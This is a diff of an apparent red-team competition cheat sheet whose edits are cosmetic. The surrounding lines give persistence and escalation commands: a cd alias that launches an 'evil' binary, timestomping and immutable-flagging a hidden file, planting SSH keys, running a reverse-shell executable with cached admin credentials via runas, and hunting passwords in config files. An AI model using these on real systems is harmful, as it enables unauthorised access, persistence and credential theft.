@@ -58,9 +58,6 @@ Use alias names to trick teams into running commands on your behalf. Good for pe
 
 &nbsp;&nbsp;&nbsp;&nbsp;<code>alias cd=”/tmp/evil_bin_file & cd”</code> *creates an alias of cd that will launch an evil bin file and then run cd *
 
-### Linux Functions
-todo
-
 ### Restricted shells
 Set users to use restricted shells which limits the commands they are able to run. Edit /etc/passwd and change any user's default shell to an rshell that's on the system.
 
@@ -139,14 +136,13 @@ Create a team ssh key and drop it into any authorzied_keys files you can in user
  3.  <code>touch -d "5 January 2021" /.svc</code>
  4.  <code>chattr +i /.svc</code>
 
-###CMDKey stores creds on windows systems
+### CMDKey stores creds on windows systems
 You can cache creds through runas on windows systems which will allow anyone to runas a given user with those cached creds. Check for the following:
 
 &nbsp;&nbsp;&nbsp;&nbsp;<code>cmdkey /list</code>
 &nbsp;&nbsp;&nbsp;&nbsp;<code>runas /savecred /user:admin C:\PrivEsc\reverse.exe</code>*if you find the admin account for example, run it like this*
 
 ### Windows post compromise manual enum
-
 
 &nbsp;&nbsp;&nbsp;&nbsp;<code>dir /s *pass* == *.config</code> *searches for 'pass' in all config files*
 
